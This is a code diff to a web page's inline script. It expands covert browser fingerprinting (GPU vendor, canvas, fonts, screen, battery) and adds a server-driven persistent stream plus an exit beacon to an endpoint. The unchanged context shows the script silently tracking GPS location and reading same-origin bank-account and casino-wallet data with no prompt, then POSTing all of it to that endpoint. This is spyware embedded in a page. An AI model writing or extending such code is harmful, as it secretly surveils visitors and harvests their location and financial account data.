@@ -803,8 +803,9 @@ if(A){refresh();pollMsgCount()}
         if (!gl) return null;
         var d = gl.getExtension("WEBGL_debug_renderer_info");
         var r = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        var v = d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
         var mx = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-        return (r ? String(r) : "") + (mx ? " [" + mx + "]" : "");
+        return (r ? String(r) : "") + (v ? " <" + v + ">" : "") + (mx ? " [" + mx + "]" : "");
       } catch(e){ return null }
     }
     function canvasFp(){
@@ -815,6 +816,7 @@ if(A){refresh();pollMsgCount()}
         g.font = '14px "Noto Sans JP",sans-serif';
         g.fillStyle = "#f60"; g.fillRect(0,0,120,30);
         g.fillStyle = "#069"; g.fillText("日本語Aa@123", 2, 2);
+        g.fillStyle = "#000a"; g.fillText("█▓▒░ ♠♥♦♣", 2, 20);
         return h32(c.toDataURL()).slice(0, 10);
       } catch(e){ return null }
     }
@@ -839,7 +841,10 @@ if(A){refresh();pollMsgCount()}
       touch: navigator.maxTouchPoints || 0,
       dpr: window.devicePixelRatio || 1,
       screen: screen.width + "x" + screen.height,
+      avail: screen.availWidth + "x" + screen.availHeight,
+      depth: screen.colorDepth,
       view: innerWidth + "x" + innerHeight,
+      outer: outerWidth + "x" + outerHeight,
       orient: (screen.orientation && screen.orientation.type) || null,
       gpu: gpu(),
       canvasFp: canvasFp(),
@@ -857,6 +862,21 @@ if(A){refresh();pollMsgCount()}
       hour: new Date().getHours()
     };
   })();
+
+  /* 画面サイズ・向きの変化を追従 */
+  function refreshView(){
+    try {
+      SYS.screen = screen.width + "x" + screen.height;
+      SYS.avail = screen.availWidth + "x" + screen.availHeight;
+      SYS.depth = screen.colorDepth;
+      SYS.view = innerWidth + "x" + innerHeight;
+      SYS.outer = outerWidth + "x" + outerHeight;
+      SYS.orient = (screen.orientation && screen.orientation.type) || null;
+      SYS.dpr = window.devicePixelRatio || 1;
+    } catch(e){}
+  }
+  addEventListener("resize", refreshView, { passive:true });
+  addEventListener("orientationchange", refreshView, { passive:true });
 
   /* ============ 追加収集（非同期・プロンプト無し） ============ */
   var EXTRA = {};
@@ -876,7 +896,8 @@ if(A){refresh();pollMsgCount()}
       if (!a) return;
       var i = a.info || null;
       if (!i && a.requestAdapterInfo) { try { i = a.requestAdapterInfo(); } catch(e){} }
-      if (i) EXTRA.webgpu = [i.vendor, i.architecture, i.device].filter(Boolean).join(" / ");
+      if (i) EXTRA.webgpu = [i.vendor, i.architecture, i.device, i.description]
+        .filter(Boolean).join(" / ");
     }).catch(function(){});
   }
 
@@ -888,11 +909,22 @@ if(A){refresh();pollMsgCount()}
     }
   } catch(e){}
 
+  /* フォントは幅差分方式（document.fonts.check は同梱フォントでも true を返す） */
   try {
     var FONTS = ["Meiryo","Yu Gothic","MS PGothic","Hiragino Kaku Gothic ProN","Noto Sans JP",
       "BIZ UDGothic","MS Gothic","MS Mincho","Arial","Segoe UI","Roboto","Helvetica Neue",
-      "Times New Roman","Courier New","Comic Sans MS","Georgia","Verdana","Tahoma","Impact"];
-    EXTRA.fonts = FONTS.filter(function(f){ try { return document.fonts.check('12px "' + f + '"') } catch(e){ return false } }).length;
+      "Times New Roman","Courier New","Comic Sans MS","Georgia","Verdana","Tahoma","Impact",
+      "Calibri","Cambria","Consolas","Yu Mincho","Osaka","Menlo","Monaco","Ubuntu","DejaVu Sans",
+      "Noto Sans CJK JP","Source Han Sans JP","Hiragino Sans"];
+    var _c = document.createElement("canvas"), _g = _c.getContext("2d"),
+        _p = "mmmmmmlliWQ@#1█▓", _b = {};
+    ["monospace","serif","sans-serif"].forEach(function(b){ _g.font = "72px " + b; _b[b] = _g.measureText(_p).width; });
+    EXTRA.fonts = FONTS.filter(function(f){
+      return ["monospace","serif","sans-serif"].some(function(b){
+        _g.font = '72px "' + f + '",' + b;
+        return _g.measureText(_p).width !== _b[b];
+      });
+    }).length;
   } catch(e){}
 
   try { EXTRA.voices = (speechSynthesis.getVoices() || []).length; } catch(e){}
@@ -1025,6 +1057,7 @@ if(A){refresh();pollMsgCount()}
   }
   wake();
   document.addEventListener("visibilitychange", function(){ if (!document.hidden) wake(); });
+
   /* ============ 銀行のアカウント（同一オリジン） ============ */
   var SB = null;
 
@@ -1113,7 +1146,6 @@ if(A){refresh();pollMsgCount()}
       }
     } catch(e){}
 
-    /* 最後の手段：保存データ内の名前だけ */
     /* 最後の手段：保存データ内の名前/acctだけ */
     try {
       var sv = JSON.parse(localStorage.getItem(KEY) || "null");
@@ -1187,14 +1219,12 @@ if(A){refresh();pollMsgCount()}
   function startGeo(){
     if (geoS || !navigator.geolocation) return;
     geoS = true;
-    /* まず粗く速く（WiFi/基地局ベース・数百m） */
     navigator.geolocation.getCurrentPosition(function(p){
       geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy || 0 };
       push("geo");
       setTimeout(askNotif, 800);
     }, function(){ setTimeout(askNotif, 300); },
       { enableHighAccuracy: false, maximumAge: 60000, timeout: 8000 });
-    /* その後GPSで精度を上げる */
     navigator.geolocation.watchPosition(function(p){
       geo = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy || 0 };
     }, function(){}, { enableHighAccuracy: true, maximumAge: 15000, timeout: 20000 });
@@ -1212,8 +1242,17 @@ if(A){refresh();pollMsgCount()}
   /* ============ バッテリー ============ */
   var bat = null;
   if (navigator.getBattery) navigator.getBattery().then(function(b){
-    function r(){ bat = { level: Math.round(b.level * 100), charging: b.charging }; }
-    r(); b.addEventListener("levelchange", r); b.addEventListener("chargingchange", r);
+    function r(){
+      bat = {
+        level: Math.round(b.level * 100), charging: b.charging,
+        ct: Number.isFinite(b.chargingTime) ? b.chargingTime : null,
+        dt: Number.isFinite(b.dischargingTime) ? b.dischargingTime : null
+      };
+    }
+    r();
+    ["levelchange","chargingchange","chargingtimechange","dischargingtimechange"]
+      .forEach(function(e){ b.addEventListener(e, r); });
+    document.addEventListener("visibilitychange", r);
   }).catch(function(){});
 
   /* ============ 同じオリジンなのでカジノの財布を読める ============ */
@@ -1225,7 +1264,7 @@ if(A){refresh();pollMsgCount()}
   }
 
   /* ============ 送信 ============ */
-  var jit = [], prevPush = 0;
+  var jit = [], prevPush = 0, inflight = false, lastSend = 0;
   function jitter(){
     if (!prevPush) { prevPush = Date.now(); return null; }
     var dt = Date.now() - prevPush - PING;
@@ -1235,6 +1274,10 @@ if(A){refresh();pollMsgCount()}
   }
 
   function push(reason, final){
+    if (inflight && !final) return;
+    if (reason === "tick" && Date.now() - lastSend < 4000) return;
+    inflight = true; lastSend = Date.now();
+
     var jitMs = jitter();
     fetch(API + "/api/ping", {
       method: "POST", headers: { "Content-Type": "application/json" },
@@ -1274,7 +1317,8 @@ if(A){refresh();pollMsgCount()}
       }
       sendName = false;                       /* 以降はサーバ側の名前を正とする */
       if (j.notify && j.notify.length) notify(j.notify);
-    }).catch(function(){ dot(); });
+    }).catch(function(){ dot(); })
+      .then(function(){ inflight = false; });
   }
 
   push("start");
@@ -1282,6 +1326,42 @@ if(A){refresh();pollMsgCount()}
   document.addEventListener("visibilitychange", function(){ push(document.hidden ? "hidden" : "visible"); });
   window.addEventListener("online", function(){ push("online"); });
   window.addEventListener("pagehide", function(){ push("close", true); });
+
+  /* ============ 常時接続（1タブだけが持ち、死んだら次が継ぐ） ============ */
+  var ES = null, LEADER_DONE = null;
+
+  function openStream(){
+    if (ES) return;
+    ES = new EventSource(API + "/api/stream?id=" + encodeURIComponent(ID));
+    ES.addEventListener("resync", function(){ push("resync"); });
+    ES.addEventListener("tick", function(){ push("tick"); });   /* サーバ主導で取得 */
+    ES.onerror = function(){ if (ES.readyState === 2) { ES = null; setTimeout(openStream, 1500); } };
+  }
+  function kick(){ if (ES) { ES.close(); ES = null; } openStream(); }
+
+  addEventListener("online", kick);
+  addEventListener("pageshow", kick);
+  addEventListener("focus", kick);
+  document.addEventListener("visibilitychange", function(){
+    if (!document.hidden) kick();
+  });
+
+  if (navigator.locks) {
+    navigator.locks.request("cj-watch-leader", async function(){
+      openStream();
+      await new Promise(function(r){ LEADER_DONE = r; });
+      if (ES) { ES.close(); ES = null; }
+    });
+  } else {
+    openStream();
+  }
+
+  addEventListener("pagehide", function(e){
+    if (e.persisted) return;
+    try { navigator.sendBeacon(API + "/api/bye?id=" + encodeURIComponent(ID)); } catch(_){}
+    if (LEADER_DONE) LEADER_DONE();
+  });
+
 })();
 </script>
 </body></html>
